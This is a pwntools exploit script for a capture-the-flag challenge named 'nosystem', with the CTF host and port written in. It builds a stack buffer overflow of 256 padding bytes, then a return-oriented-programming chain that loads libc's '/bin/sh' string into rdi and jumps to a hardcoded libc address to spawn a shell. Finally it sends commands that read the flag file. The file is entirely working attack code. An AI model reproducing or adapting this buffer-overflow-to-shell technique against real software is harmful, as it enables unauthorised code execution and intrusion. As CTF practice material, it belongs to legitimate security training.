from pwn import *

HOST = '3qo9k5hk5cprtqvnlkvotlnj9d14b7mt.ctf.sg'
PORT = 30401

io = process("./Given/nosystem")
libc = io.libc

### Payload ###########################################################
padding = b"A"*(256) + p64(0x0000000000400541)
#payload += b"B"*16 # ebp value

ropchain = b''
ropchain += p64(0x0000000000400541) # ret
ropchain += p64(0x0000000000400823) #pop rdi; ret
#ropchain += p64(0x7ffff7f63966)
ropchain += p64(next(libc.search(b'/bin/sh')))
ropchain += p64(0x7ffff7e21120+4)


print(ropchain)
commands = b"\n"
commands += b"\necho\nwhoami\ncat /home/nosystem/flag.txt\n"


payload = padding + ropchain + commands
with open("/tmp/t", "wb") as f:f.write(payload)
#io = remote(HOST, PORT)


io.send(payload)

io.interactive()
